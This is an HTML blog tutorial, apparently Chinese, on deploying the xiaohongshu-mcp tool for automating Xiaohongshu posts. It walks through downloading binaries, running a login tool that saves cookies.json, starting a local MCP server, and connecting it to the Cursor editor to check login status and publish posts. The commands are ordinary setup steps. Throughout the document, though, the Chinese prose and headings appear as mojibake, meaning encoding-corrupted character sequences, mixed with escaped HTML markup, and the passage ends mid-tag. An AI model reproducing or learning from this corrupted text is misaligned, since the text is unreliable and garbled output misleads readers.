æ‘˜è¦ï¼šæœ¬æ–‡è¯¦ç»†ä»‹ç»å¦‚ä½•å¿«é€Ÿéƒ¨ç½²å°çº¢ä¹¦MCPè‡ªåŠ¨åŒ–è¿è¥å·¥å…·ã€‚é€šè¿‡ä¸‹è½½é¢„ç¼–è¯‘å®‰è£…åŒ…ï¼Œå®ŒæˆNode.jsçŽ¯å¢ƒé…ç½®åŽï¼Œè¿è¡Œç™»å½•å·¥å…·èŽ·å–cookies.jsonè®¤è¯æ–‡ä»¶ï¼Œå¯åŠ¨MCPä¸»æœåŠ¡å¹¶éªŒè¯è¿žæŽ¥ã€‚æœ€åŽæŽ¥å…¥Cursorç¼–è¾‘å™¨å®žçŽ°è‡ªç„¶è¯­è¨€æŽ§åˆ¶ï¼Œæ¼”ç¤ºäº†è´¦å·çŠ¶æ€æ£€æŸ¥å’Œå›¾æ–‡å‘å¸ƒç­‰æ ¸å¿ƒåŠŸèƒ½ã€‚æ•´ä¸ªè¿‡ç¨‹æ— éœ€å¤æ‚é…ç½®ï¼Œé€‚åˆæ–°æ‰‹å¿«é€Ÿå®žçŽ°å°çº¢ä¹¦å†…å®¹è‡ªåŠ¨åŒ–ç®¡ç†ã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>@</p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#ä¸€å‰è¨€\" rel=\"noopener nofollow\">ä¸€ã€å‰è¨€</a></li><li><a href=\"#äºŒå‡†å¤‡å·¥ä½œ\" rel=\"noopener nofollow\">äºŒã€å‡†å¤‡å·¥ä½œ</a><ul><li><a href=\"#21-ç³»ç»ŸçŽ¯å¢ƒè¯´æ˜Ž\" rel=\"noopener nofollow\">2.1 ç³»ç»ŸçŽ¯å¢ƒè¯´æ˜Ž</a></li><li><a href=\"#22-å¿…è£…ä¾èµ–ä»…2ä¸ªæžç®€\" rel=\"noopener nofollow\">2.2 å¿…è£…ä¾èµ–ï¼ˆä»…2ä¸ªï¼Œæžç®€ï¼‰</a><ul><li><a href=\"#1nodejsç”¨äºŽmcpè¿žæŽ¥éªŒè¯\" rel=\"noopener nofollow\">ï¼ˆ1ï¼‰Node.jsï¼ˆç”¨äºŽMCPè¿žæŽ¥éªŒè¯ï¼‰</a></li><li><a href=\"#2ç½‘ç»œçŽ¯å¢ƒ\" rel=\"noopener nofollow\">ï¼ˆ2ï¼‰ç½‘ç»œçŽ¯å¢ƒ</a></li></ul></li><li><a href=\"#23-ä¸‹è½½å°çº¢ä¹¦mcpå®‰è£…åŒ\" rel=\"noopener nofollow\">2.3 ä¸‹è½½å°çº¢ä¹¦MCPå®‰è£…åŒ…</a></li></ul></li><li><a href=\"#ä¸‰éƒ¨ç½²å°çº¢ä¹¦mcpæœåŠ¡\" rel=\"noopener nofollow\">ä¸‰ã€éƒ¨ç½²å°çº¢ä¹¦MCPæœåŠ¡</a><ul><li><a href=\"#31-è§£åŽ‹å®‰è£…åŒ…å¹¶ç¡®è®¤æ–‡ä»¶ç»“æž„\" rel=\"noopener nofollow\">3.1 è§£åŽ‹å®‰è£…åŒ…å¹¶ç¡®è®¤æ–‡ä»¶ç»“æž„</a></li><li><a href=\"#32-è¿è¡Œç™»å½•å·¥å…·å®Œæˆå°çº¢ä¹¦è®¤è¯\" rel=\"noopener nofollow\">3.2 è¿è¡Œç™»å½•å·¥å…·å®Œæˆå°çº¢ä¹¦è®¤è¯</a></li><li><a href=\"#33-å¯åŠ¨mcpä¸»æœåŠ¡\" rel=\"noopener nofollow\">3.3 å¯åŠ¨MCPä¸»æœåŠ¡</a></li><li><a href=\"#34-éªŒè¯mcpæœåŠ¡æ˜¯å¦æ­£å¸¸\" rel=\"noopener nofollow\">3.4 éªŒè¯MCPæœåŠ¡æ˜¯å¦æ­£å¸¸</a></li></ul></li><li><a href=\"#å››æŽ¥å…¥cursorç¼–è¾‘å™¨\" rel=\"noopener nofollow\">å››ã€æŽ¥å…¥Cursorç¼–è¾‘å™¨</a><ul><li><a href=\"#41-æ‰¾åˆ°cursorçš„mcpé…ç½®æ–‡ä»¶\" rel=\"noopener nofollow\">4.1 æ‰¾åˆ°Cursorçš„MCPé…ç½®æ–‡ä»¶</a></li><li><a href=\"#42-é…ç½®mcpè¿žæŽ¥ä¿¡æ¯\" rel=\"noopener nofollow\">4.2 é…ç½®MCPè¿žæŽ¥ä¿¡æ¯</a></li><li><a href=\"#43-éªŒè¯cursorä¸Žmcpçš„è¿žæŽ¥\" rel=\"noopener nofollow\">4.3 éªŒè¯Cursorä¸ŽMCPçš„è¿žæŽ¥</a></li></ul></li><li><a href=\"#äº”cursorä¸­ä½¿ç”¨å°çº¢ä¹¦mcpå®žæˆ˜\" rel=\"noopener nofollow\">äº”ã€Cursorä¸­ä½¿ç”¨å°çº¢ä¹¦MCPå®žæˆ˜</a><ul><li><a href=\"#51-åŸºç¡€åŠŸèƒ½æ£€æŸ¥ç™»å½•çŠ¶æ€\" rel=\"noopener nofollow\">5.1 åŸºç¡€åŠŸèƒ½ï¼šæ£€æŸ¥ç™»å½•çŠ¶æ€</a></li><li><a href=\"#52-æ ¸å¿ƒåŠŸèƒ½å‘å¸ƒå°çº¢ä¹¦å›¾æ–‡\" rel=\"noopener nofollow\">5.2 æ ¸å¿ƒåŠŸèƒ½ï¼šå‘å¸ƒå°çº¢ä¹¦å›¾æ–‡</a><ul><li><a href=\"#æ­¥éª¤1å‡†å¤‡å‘å¸ƒç´ æ\" rel=\"noopener nofollow\">æ­¥éª¤1ï¼šå‡†å¤‡å‘å¸ƒç´ æ</a></li><li><a href=\"#æ­¥éª¤2åœ¨cursorä¸­å‘é€å‘å¸ƒæŒ‡ä»¤\" rel=\"noopener nofollow\">æ­¥éª¤2ï¼šåœ¨Cursorä¸­å‘é€å‘å¸ƒæŒ‡ä»¤</a></li><li><a href=\"#æ­¥éª¤3æŸ¥çœ‹å‘å¸ƒç»“æžœ\" rel=\"noopener nofollow\">æ­¥éª¤3ï¼šæŸ¥çœ‹å‘å¸ƒç»“æžœ</a></li></ul></li><li><a href=\"#53-å…¶ä»–å¸¸ç”¨åŠŸèƒ½è°ƒç”¨\" rel=\"noopener nofollow\">5.3 å…¶ä»–å¸¸ç”¨åŠŸèƒ½è°ƒç”¨</a></li></ul></li><li><a href=\"#å…­å¸¸è§é—®é¢˜ä¸Žè§£å†³æ–¹æ¡ˆ\" rel=\"noopener nofollow\">å…­ã€å¸¸è§é—®é¢˜ä¸Žè§£å†³æ–¹æ¡ˆ</a><ul><li><a href=\"#é—®é¢˜1ç™»å½•å·¥å…·è¿è¡ŒåŽæ— å¼¹çª—ä¸‹è½½æµè§ˆå™¨å¤±è´¥\" rel=\"noopener nofollow\">é—®é¢˜1ï¼šç™»å½•å·¥å…·è¿è¡ŒåŽæ— å¼¹çª—/ä¸‹è½½æµè§ˆå™¨å¤±è´¥</a></li><li><a href=\"#é—®é¢˜2cursoræç¤ºæ— æ³•è¿žæŽ¥åˆ°mcpæœåŠ¡\" rel=\"noopener nofollow\">é—®é¢˜2ï¼šCursoræç¤ºã€Œæ— æ³•è¿žæŽ¥åˆ°MCPæœåŠ¡ã€</a></li><li><a href=\"#é—®é¢˜3å‘å¸ƒå›¾æ–‡æç¤ºå›¾ç‰‡è·¯å¾„é”™è¯¯\" rel=\"noopener nofollow\">é—®é¢˜3ï¼šå‘å¸ƒå›¾æ–‡æç¤ºã€Œå›¾ç‰‡è·¯å¾„é”™è¯¯ã€</a></li><li><a href=\"#é—®é¢˜4è´¦å·è¢«è¸¢ä¸‹çº¿\" rel=\"noopener nofollow\">é—®é¢˜4ï¼šè´¦å·è¢«è¸¢ä¸‹çº¿</a></li></ul></li><li><a href=\"#ä¸ƒæ€»ç»“\" rel=\"noopener nofollow\">ä¸ƒã€æ€»ç»“</a></li></ul></div><br />\n<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /><p></p>\n<h1 id=\"ä¸€å‰è¨€\">ä¸€ã€å‰è¨€</h1>\n<p>å°çº¢ä¹¦MCPï¼ˆxiaohongshu-mcpï¼‰æ˜¯ä¸€æ¬¾èƒ½å®žçŽ°å°çº¢ä¹¦è‡ªåŠ¨åŒ–è¿è¥çš„å·¥å…·ï¼Œæ”¯æŒç™»å½•éªŒè¯ã€å›¾æ–‡/è§†é¢‘å‘å¸ƒã€è¯„è®ºäº’åŠ¨ã€ç”¨æˆ·ä¿¡æ¯æŸ¥è¯¢ç­‰æ ¸å¿ƒåŠŸèƒ½ã€‚ç›¸æ¯”æºç ç¼–è¯‘ã€Dockeréƒ¨ç½²ï¼Œ<strong>ä¸‹è½½é¢„ç¼–è¯‘å®‰è£…åŒ…</strong>æ˜¯æœ€å¿«æ·çš„æ–¹å¼ï¼Œæ— éœ€é…ç½®å¼€å‘çŽ¯å¢ƒï¼Œæ–°æ‰‹ä¹Ÿèƒ½å¿«é€Ÿä¸Šæ‰‹ã€‚</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<p>æœ¬æ–‡å°†å…¨ç¨‹åŸºäºŽã€Œå®‰è£…åŒ…ä¸‹è½½ã€çš„æ–¹å¼ï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ å®Œæˆå°çº¢ä¹¦MCPçš„éƒ¨ç½²ã€æŽ¥å…¥Cursorç¼–è¾‘å™¨ï¼Œå¹¶æ¼”ç¤ºæ ¸å¿ƒåŠŸèƒ½çš„ä½¿ç”¨ï¼Œè®©ä½ è½»æ¾å®žçŽ°å°çº¢ä¹¦å†…å®¹çš„è‡ªåŠ¨åŒ–ç®¡ç†ã€‚</p>\n<h1 id=\"äºŒå‡†å¤‡å·¥ä½œ\">äºŒã€å‡†å¤‡å·¥ä½œ</h1>\n<h2 id=\"21-ç³»ç»ŸçŽ¯å¢ƒè¯´æ˜Ž\">2.1 ç³»ç»ŸçŽ¯å¢ƒè¯´æ˜Ž</h2>\n<p>æ”¯æŒçš„ç³»ç»Ÿç‰ˆæœ¬ï¼ˆè¯·å¯¹åº”ä¸‹è½½ï¼‰ï¼š</p>\n<ul>\n<li>macOSï¼šApple Siliconï¼ˆarm64ï¼‰/ Intelï¼ˆamd64ï¼‰</li>\n<li>Windowsï¼šx64ï¼ˆWindows 10/11 å‡å¯ï¼‰</li>\n<li>Linuxï¼šx64</li>\n</ul>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h2 id=\"22-å¿…è£…ä¾èµ–ä»…2ä¸ªæžç®€\">2.2 å¿…è£…ä¾èµ–ï¼ˆä»…2ä¸ªï¼Œæžç®€ï¼‰</h2>\n<h3 id=\"1nodejsç”¨äºŽmcpè¿žæŽ¥éªŒè¯\">ï¼ˆ1ï¼‰Node.jsï¼ˆç”¨äºŽMCPè¿žæŽ¥éªŒè¯ï¼‰</h3>\n<p>æ— è®ºå“ªä¸ªç³»ç»Ÿï¼Œå»ºè®®é€šè¿‡å®˜æ–¹æŽ¨èæ–¹å¼å®‰è£…Node.js LTSç‰ˆæœ¬ï¼Œç¡®ä¿çŽ¯å¢ƒå˜é‡è‡ªåŠ¨é…ç½®ï¼š</p>\n<ul>\n<li>Windowsï¼šæ‰“å¼€ã€Œç®¡ç†å‘˜å‘½ä»¤è¡Œã€æ‰§è¡Œ<pre><code class=\"language-bash\">winget install OpenJS.NodeJS.LTS\n</code></pre>\n</li>\n<li>macOS/Linuxï¼šå‚è€ƒ <a href=\"https://nodejs.org/zh-cn/download/\" rel=\"noopener nofollow\" target=\"_blank\">Node.jså®˜æ–¹ä¸‹è½½é¡µ</a> å®‰è£…LTSç‰ˆæœ¬</li>\n</ul>\n<h3 id=\"2ç½‘ç»œçŽ¯å¢ƒ\">ï¼ˆ2ï¼‰ç½‘ç»œçŽ¯å¢ƒ</h3>\n<p>é¦–æ¬¡è¿è¡Œä¼šè‡ªåŠ¨ä¸‹è½½æ— å¤´æµè§ˆå™¨ï¼ˆçº¦150MBï¼‰ï¼Œéœ€ç¡®ä¿ç½‘ç»œé€šç•…ï¼ŒåŽç»­æ— éœ€é‡å¤ä¸‹è½½ã€‚</p>\n<h2 id=\"23-ä¸‹è½½å°çº¢ä¹¦mcpå®‰è£…åŒ…\">2.3 ä¸‹è½½å°çº¢ä¹¦MCPå®‰è£…åŒ…</h2>\n<ol>\n<li>æ‰“å¼€ <a href=\"https://github.com/xpzouying/xiaohongshu-mcp/releases\" rel=\"noopener nofollow\" target=\"_blank\">xiaohongshu-mcpçš„GitHub Releasesé¡µé¢</a></li>\n<li>æ ¹æ®è‡ªå·±çš„ç³»ç»Ÿä¸‹è½½å¯¹åº”å®‰è£…åŒ…ï¼š\n<ul>\n<li>Windows x64ï¼š<code>xiaohongshu-mcp-windows-amd64.zip</code></li>\n<li>macOS Apple Siliconï¼š<code>xiaohongshu-mcp-darwin-arm64.zip</code></li>\n<li>macOS Intelï¼š<code>xiaohongshu-mcp-darwin-amd64.zip</code></li>\n<li>Linux x64ï¼š<code>xiaohongshu-mcp-linux-amd64.zip</code></li>\n</ul>\n</li>\n<li>ä¸‹è½½å®ŒæˆåŽï¼Œå°†åŽ‹ç¼©åŒ…è§£åŽ‹åˆ°ä»»æ„ç›®å½•ï¼ˆå»ºè®®è·¯å¾„ä¸å«ä¸­æ–‡/ç©ºæ ¼ï¼Œæ¯”å¦‚ <code>D:\\xiaohongshu-mcp</code> æˆ– <code>/Users/ä½ çš„ç”¨æˆ·å/xiaohongshu-mcp</code>ï¼‰ã€‚</li>\n</ol>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<p>æ³¨æ„cookies.jsonæ˜¯ç™»å½•ä¹‹åŽæ‰ä¼šæœ‰çš„ï¼Œåˆšåˆšè§£åŽ‹å®Œåªä¼šæœ‰æˆ‘åœˆèµ·æ¥çš„è¿™ä¸¤ä¸ª</p>\n<h1 id=\"ä¸‰éƒ¨ç½²å°çº¢ä¹¦mcpæœåŠ¡\">ä¸‰ã€éƒ¨ç½²å°çº¢ä¹¦MCPæœåŠ¡</h1>\n<h2 id=\"31-è§£åŽ‹å®‰è£…åŒ…å¹¶ç¡®è®¤æ–‡ä»¶ç»“æž„\">3.1 è§£åŽ‹å®‰è£…åŒ…å¹¶ç¡®è®¤æ–‡ä»¶ç»“æž„</h2>\n<p>è§£åŽ‹åŽç›®å½•å†…ä¼šåŒ…å«ä¸¤ä¸ªæ ¸å¿ƒæ–‡ä»¶ï¼ˆä»¥Windowsä¸ºä¾‹ï¼‰ï¼š</p>\n<ul>\n<li><code>xiaohongshu-login-windows-amd64.exe</code>ï¼šç™»å½•å·¥å…·ï¼ˆå¿…å…ˆè¿è¡Œï¼‰</li>\n<li><code>xiaohongshu-mcp-windows-amd64.exe</code>ï¼šMCPä¸»æœåŠ¡ç¨‹åº</li>\n</ul>\n<blockquote>\n<p>å…¶ä»–ç³»ç»Ÿå¯¹åº”æ–‡ä»¶ï¼šmacOSæ˜¯<code>xiaohongshu-login-darwin-arm64</code>/<code>xiaohongshu-mcp-darwin-arm64</code>ï¼ŒLinuxæ˜¯<code>xiaohongshu-login-linux-amd64</code>/<code>xiaohongshu-mcp-linux-amd64</code>ã€‚</p>\n</blockquote>\n<h2 id=\"32-è¿è¡Œç™»å½•å·¥å…·å®Œæˆå°çº¢ä¹¦è®¤è¯\">3.2 è¿è¡Œç™»å½•å·¥å…·å®Œæˆå°çº¢ä¹¦è®¤è¯</h2>\n<p>è¿™æ˜¯æ ¸å¿ƒæ­¥éª¤ï¼ŒMCPæœåŠ¡ä¾èµ–ç™»å½•åŽçš„Cookiesæ‰èƒ½æ­£å¸¸å·¥ä½œï¼š</p>\n<ol>\n<li>æ‰“å¼€ç»ˆç«¯/å‘½ä»¤è¡Œï¼Œè¿›å…¥è§£åŽ‹ç›®å½•ï¼š\n<ul>\n<li>Windowsï¼šåœ¨è§£åŽ‹æ–‡ä»¶å¤¹ç©ºç™½å¤„å³é”® â†’ ã€Œåœ¨ç»ˆç«¯ä¸­æ‰“å¼€ã€</li>\n<li>macOS/Linuxï¼šæ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œ <code>cd /ä½ çš„è§£åŽ‹è·¯å¾„/xiaohongshu-mcp</code></li>\n</ul>\n</li>\n<li>è¿è¡Œç™»å½•å·¥å…·ï¼š\n<ul>\n<li>Windowsï¼š<pre><code class=\"language-bash\">./xiaohongshu-login-windows-amd64.exe\n</code></pre>\n</li>\n<li>macOS/Linuxï¼š<pre><code class=\"language-bash\">chmod +x xiaohongshu-login-darwin-arm64  # èµ‹äºˆæ‰§è¡Œæƒé™ï¼ˆä»…é¦–æ¬¡ï¼‰\n./xiaohongshu-login-darwin-arm64\n</code></pre>\n</li>\n</ul>\n</li>\n<li>ç™»å½•æµç¨‹ï¼š\n<ul>\n<li>è¿è¡ŒåŽä¼šè‡ªåŠ¨ä¸‹è½½æ— å¤´æµè§ˆå™¨ï¼ˆè€å¿ƒç­‰å¾…ï¼‰ï¼›</li>\n<li>å¼¹å‡ºå°çº¢ä¹¦ç™»å½•é¡µé¢ï¼ˆæ‰«ç /æ‰‹æœºå·ç™»å½•å‡å¯ï¼‰ï¼›</li>\n<li>ç™»å½•æˆåŠŸåŽï¼Œç»ˆç«¯ä¼šæç¤ºã€Œç™»å½•æˆåŠŸã€ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆ <code>cookies.json</code> æ–‡ä»¶ï¼ˆä¿å­˜åœ¨å½“å‰ç›®å½•ï¼Œåˆ‡å‹¿åˆ é™¤ï¼‰ã€‚</li>\n</ul>\n</li>\n</ol>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<blockquote>\n<p>âš ï¸ é‡è¦æé†’ï¼šå°çº¢ä¹¦è´¦å·ä¸å…è®¸å¤šç½‘é¡µç«¯ç™»å½•ï¼Œç™»å½•MCPåŽï¼Œä¸è¦åœ¨å…¶ä»–æµè§ˆå™¨ç™»å½•åŒä¸€è´¦å·ï¼Œå¦åˆ™ä¼šè¢«è¸¢ä¸‹çº¿ï¼ˆæ‰‹æœºAppç™»å½•ä¸å—å½±å“ï¼‰ã€‚</p>\n</blockquote>\n<h2 id=\"33-å¯åŠ¨mcpä¸»æœåŠ¡\">3.3 å¯åŠ¨MCPä¸»æœåŠ¡</h2>\n<p>ç™»å½•æˆåŠŸåŽï¼Œç»§ç»­åœ¨ç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨MCPæœåŠ¡ï¼š</p>\n<ul>\n<li>Windowsï¼š<pre><code class=\"language-bash\"># æ— å¤´æ¨¡å¼ï¼ˆæ— æµè§ˆå™¨ç•Œé¢ï¼ŒæŽ¨èç”Ÿäº§ä½¿ç”¨ï¼‰\n./xiaohongshu-mcp-windows-amd64.exe\n\n# éžæ— å¤´æ¨¡å¼ï¼ˆæœ‰æµè§ˆå™¨ç•Œé¢ï¼Œè°ƒè¯•ç”¨ï¼‰\n./xiaohongshu-mcp-windows-amd64.exe -headless=false\n</code></pre>\n</li>\n<li>macOS/Linuxï¼š<pre><code class=\"language-bash\">chmod +x xiaohongshu-mcp-darwin-arm64  # èµ‹äºˆæ‰§è¡Œæƒé™ï¼ˆä»…é¦–æ¬¡ï¼‰\n# æ— å¤´æ¨¡å¼\n./xiaohongshu-mcp-darwin-arm64\n# éžæ— å¤´æ¨¡å¼\n./xiaohongshu-mcp-darwin-arm64 -headless=false\n</code></pre>\n</li>\n</ul>\n<p>å¯åŠ¨æˆåŠŸçš„æ ‡å¿—ï¼šç»ˆç«¯æ— æŠ¥é”™ï¼Œä¸”æ˜¾ç¤ºã€ŒMCPæœåŠ¡å¯åŠ¨æˆåŠŸï¼Œç«¯å£ï¼š18060ã€ï¼ˆé»˜è®¤ç«¯å£18060ï¼Œè¯·å‹¿å ç”¨ï¼‰ã€‚<br />\n<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h2 id=\"34-éªŒè¯mcpæœåŠ¡æ˜¯å¦æ­£å¸¸\">3.4 éªŒè¯MCPæœåŠ¡æ˜¯å¦æ­£å¸¸</h2>\n<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤éªŒè¯æœåŠ¡å¯ç”¨æ€§ï¼š</p>\n<pre><code class=\"language-bash\">npx @modelcontextprotocol/inspector\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /><br />\n<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /><br />\nå·¦ä¸Šè§’<strong>Transport Type</strong>ä¸‹æ‹‰æ¡†ï¼ŒæŠŠSTDIOæ”¹æˆ<strong>Streamable HTTP</strong>ï¼›<br />\næ”¹å®ŒåŽç•Œé¢ä¼šå‡ºçŽ°URLè¾“å…¥æ¡†ï¼ŒæŠŠhttp://localhost:18060/mcpå¡«åˆ°è¿™ä¸ª <strong>URL æ¡†é‡Œ</strong>ï¼›<br />\nç‚¹å‡»å·¦ä¾§çš„<strong>Connect</strong>æŒ‰é’®ã€‚<br />\næˆåŠŸæ ‡å¿—ï¼š<strong>å·¦ä¸‹è§’æ˜¾ç¤ºConnected</strong><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<p>ç‚¹å‡»ä¸­é—´çš„List Tools<br />\nä¸­é—´åŒºåŸŸåŠ è½½å‡ºå°çº¢ä¹¦ MCP çš„æ‰€æœ‰å·¥å…· / èƒ½åŠ›åˆ—è¡¨ã€<br />\n<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h1 id=\"å››æŽ¥å…¥cursorç¼–è¾‘å™¨\">å››ã€æŽ¥å…¥Cursorç¼–è¾‘å™¨</h1>\n<p>Cursoræ˜¯æ”¯æŒMCPåè®®çš„AIç¼–è¾‘å™¨ï¼ŒæŽ¥å…¥åŽå¯ç›´æŽ¥åœ¨Cursorä¸­é€šè¿‡è‡ªç„¶è¯­è¨€è°ƒç”¨å°çº¢ä¹¦MCPçš„æ‰€æœ‰åŠŸèƒ½ï¼Œæ— éœ€æ‰‹åŠ¨å†™æŽ¥å£è¯·æ±‚ã€‚</p>\n<h2 id=\"41-æ‰¾åˆ°cursorçš„mcpé…ç½®æ–‡ä»¶\">4.1 æ‰¾åˆ°Cursorçš„MCPé…ç½®æ–‡ä»¶</h2>\n<ol>\n<li>æ‰“å¼€Cursorç¼–è¾‘å™¨ï¼›</li>\n<li>ç¡®è®¤Cursorçš„MCPé…ç½®ç›®å½•ï¼š\n<ul>\n<li>æ ¸å¿ƒé…ç½®æ–‡ä»¶è·¯å¾„å‚è€ƒï¼š<code>.cursor/mcp.json</code>ï¼ˆå¯åœ¨Cursorçš„ã€Œè®¾ç½®â†’MCPã€ä¸­æ‰¾åˆ°é…ç½®å…¥å£ï¼Œæˆ–ç›´æŽ¥åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºè¯¥æ–‡ä»¶ï¼‰ã€‚</li>\n</ul>\n</li>\n</ol>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /><br />\n<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h2 id=\"42-é…ç½®mcpè¿žæŽ¥ä¿¡æ¯\">4.2 é…ç½®MCPè¿žæŽ¥ä¿¡æ¯</h2>\n<p>åˆ›å»º/ç¼–è¾‘ <code>.cursor/mcp.json</code> æ–‡ä»¶ï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>\n<pre><code class=\"language-json\">{\n    \"mcpServers\": {\n        \"xiaohongshu-mcp\": {\n            \"url\": \"http://localhost:18060/mcp\",\n            \"description\": \"å°çº¢ä¹¦å†…å®¹å‘å¸ƒæœåŠ¡ - MCP Streamable HTTP\"\n        }\n    }\n}\n</code></pre>\n<p>ä¿å­˜æ–‡ä»¶åŽï¼Œé‡å¯Cursorè®©é…ç½®ç”Ÿæ•ˆã€‚</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h2 id=\"43-éªŒè¯cursorä¸Žmcpçš„è¿žæŽ¥\">4.3 éªŒè¯Cursorä¸ŽMCPçš„è¿žæŽ¥</h2>\n<ol>\n<li>æ‰“å¼€Cursorï¼Œæ–°å»ºä¸€ä¸ªå¯¹è¯çª—å£ï¼›</li>\n<li>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ï¼š<code>æ£€æŸ¥å°çº¢ä¹¦MCPçš„ç™»å½•çŠ¶æ€</code>ï¼›</li>\n<li>å‘é€æŒ‡ä»¤åŽï¼ŒCursorä¼šè‡ªåŠ¨è°ƒç”¨å°çº¢ä¹¦MCPçš„ã€Œæ£€æŸ¥ç™»å½•çŠ¶æ€ã€åŠŸèƒ½ï¼Œè¿”å›žã€Œå½“å‰è´¦å·å·²ç™»å½•ã€å³ä»£è¡¨æŽ¥å…¥æˆåŠŸã€‚</li>\n</ol>\n<h1 id=\"äº”cursorä¸­ä½¿ç”¨å°çº¢ä¹¦mcpå®žæˆ˜\">äº”ã€Cursorä¸­ä½¿ç”¨å°çº¢ä¹¦MCPå®žæˆ˜</h1>\n<h2 id=\"51-åŸºç¡€åŠŸèƒ½æ£€æŸ¥ç™»å½•çŠ¶æ€\">5.1 åŸºç¡€åŠŸèƒ½ï¼šæ£€æŸ¥ç™»å½•çŠ¶æ€</h2>\n<p>åœ¨Cursorå¯¹è¯æ¡†ä¸­è¾“å…¥ï¼š</p>\n<pre><code>æ£€æŸ¥æˆ‘çš„å°çº¢ä¹¦è´¦å·ç™»å½•çŠ¶æ€\n</code></pre>\n<p>å‘é€åŽï¼ŒMCPä¼šè¿”å›žå½“å‰è´¦å·çš„ç™»å½•çŠ¶æ€ï¼ˆå·²ç™»å½•/æœªç™»å½•ï¼‰ï¼Œå¦‚æžœæœªç™»å½•ï¼Œéœ€é‡æ–°è¿è¡Œç™»å½•å·¥å…·ã€‚</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /><br />\n<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h2 id=\"52-æ ¸å¿ƒåŠŸèƒ½å‘å¸ƒå°çº¢ä¹¦å›¾æ–‡\">5.2 æ ¸å¿ƒåŠŸèƒ½ï¼šå‘å¸ƒå°çº¢ä¹¦å›¾æ–‡</h2>\n<h3 id=\"æ­¥éª¤1å‡†å¤‡å‘å¸ƒç´ æ\">æ­¥éª¤1ï¼šå‡†å¤‡å‘å¸ƒç´ æ</h3>\n<ul>\n<li>æœ¬åœ°å›¾ç‰‡ï¼šå°†å›¾ç‰‡æ”¾åˆ°MCPè§£åŽ‹ç›®å½•çš„ <code>images</code> æ–‡ä»¶å¤¹ï¼ˆæ²¡æœ‰åˆ™æ–°å»ºï¼‰ï¼›</li>\n<li>æ–‡æ¡ˆï¼šæ ‡é¢˜ï¼ˆâ‰¤20å­—ï¼‰+ æ­£æ–‡ï¼ˆâ‰¤1000å­—ï¼‰+ æ ‡ç­¾ï¼ˆå¯é€‰ï¼‰ã€‚</li>\n</ul>\n<h3 id=\"æ­¥éª¤2åœ¨cursorä¸­å‘é€å‘å¸ƒæŒ‡ä»¤\">æ­¥éª¤2ï¼šåœ¨Cursorä¸­å‘é€å‘å¸ƒæŒ‡ä»¤</h3>\n<pre><code>@xiaohongshu-mcp å‘å¸ƒä¸€ç¯‡å°çº¢ä¹¦å›¾æ–‡ï¼Œæ ‡é¢˜ï¼šã€Œæ–°æ‰‹å¿…çœ‹çš„MCPéƒ¨ç½²æ•™ç¨‹ã€ï¼Œæ­£æ–‡ï¼šã€Œæ— éœ€ç¼–è¯‘æºç ï¼Œä¸‹è½½å®‰è£…åŒ…å°±èƒ½éƒ¨ç½²å°çº¢ä¹¦MCPï¼Œé™„CursoræŽ¥å…¥å…¨æµç¨‹ï½žã€ï¼Œå›¾ç‰‡ä½¿ç”¨æœ¬åœ°è·¯å¾„ï¼š/Users/ä½ çš„ç”¨æˆ·å/xiaohongshu-mcp/images/æ•™ç¨‹å°é¢.jpgï¼Œæ·»åŠ æ ‡ç­¾ï¼š#MCP #å°çº¢ä¹¦è‡ªåŠ¨åŒ– #Cursor\n</code></pre>\n<blockquote>\n<p>æ³¨æ„ï¼š</p>\n<ul>\n<li>å›¾ç‰‡è·¯å¾„éœ€å†™ç»å¯¹è·¯å¾„ï¼ˆWindowsç¤ºä¾‹ï¼š<code>D:\\xiaohongshu-mcp\\images\\æ•™ç¨‹å°é¢.jpg</code>ï¼‰ï¼›</li>\n<li>æ ‡é¢˜å’Œæ­£æ–‡éœ€ç¬¦åˆå°çº¢ä¹¦å­—æ•°é™åˆ¶ï¼ˆæ ‡é¢˜â‰¤20å­—ï¼Œæ­£æ–‡â‰¤1000å­—ï¼‰ã€‚</li>\n</ul>\n</blockquote>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" class=\"lazyload\" /></p>\n<h3 